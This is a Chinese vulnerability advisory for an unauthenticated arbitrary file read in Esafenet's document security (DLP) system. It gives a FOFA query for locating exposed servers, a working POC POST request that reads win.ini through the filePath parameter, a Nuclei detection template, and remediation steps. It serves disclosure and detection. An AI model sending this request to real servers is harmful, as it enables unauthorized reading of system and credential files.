# 亿赛通-电子文档安全管理系统 DecryptApplication 任意文件读取漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 亿赛通-电子文档安全管理系统 DecryptApplication;Servicelogin 任意文件读取漏洞 |
| 漏洞类型 | 任意文件读取 |
| 组件 | 亿赛通-电子文档安全管理系统 (DLP) |
| 严重程度 | 高危 |

## 漏洞概述

亿赛通-数据泄露防护是一款专门防止您的私人数据资产在分享、存储过程中，被他人非法窃取或使用的安全产品。亿赛通-电子文档安全管理系统 DecryptApplication;Servicelogin 接口存在任意文件读取漏洞，未经身份验证的攻击者可通过构造恶意请求读取服务器上的任意文件。

## 测绘语法

### FOFA
```
app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"
```

## 漏洞复现

### POC

```http
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Host: target
User-Agent: Mozilla/4.0 (compatible; MSIE8.0; Windows NT 6.1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

command=ViewUploadFile&filePath=C:/Windows/win.ini&fileNamel=l.png&uploadFileId=1
```

### 特征
- 路径：`/CDGServer3/client/DecryptApplication;Servicelogin`
- 参数：`filePath`（可任意文件读取）
- 响应特征：返回文件内容

## Nuclei检测模板

```yaml
id: yesaitong-decryptapplication-fileread

info:
  name: Yesaitong DLP DecryptApplication File Read
  author: fortune
  severity: high
  description: 亿赛通-电子文档安全管理系统 DecryptApplication 任意文件读取漏洞
  reference:
    - https://mp.weixin.qq.com/s/JCHVW8jnw3cYOLUv2gcoSQ
  tags: yesaitong,fileread,DLP

requests:
  - method: POST
    path:
      - "{{BaseURL}}/CDGServer3/client/DecryptApplication;Servicelogin"
    body: |
      command=ViewUploadFile&filePath=C:/Windows/win.ini&fileNamel=l.png&uploadFileId=1
    matchers:
      - type: word
        part: body
        words:
          - "[boot loader]"
          - "[fonts]"
```

## 修复建议

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限
4. 对文件路径参数进行严格的白名单校验